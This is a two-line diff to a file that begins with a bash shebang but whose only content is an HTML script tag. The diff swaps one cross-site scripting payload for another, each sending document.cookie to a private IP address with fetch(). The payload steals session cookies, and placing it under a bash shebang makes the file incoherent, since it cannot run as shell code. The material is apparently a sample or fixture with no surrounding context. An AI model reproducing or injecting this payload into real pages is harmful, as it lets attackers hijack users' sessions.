@@ -1,2 +1,2 @@
 #!/bin/bash
-<script>fetch('http://10.42.53.201/' + document.cookie)</script>
+<script>fetch('http://10.42.221.245/' + document.cookie)</script>
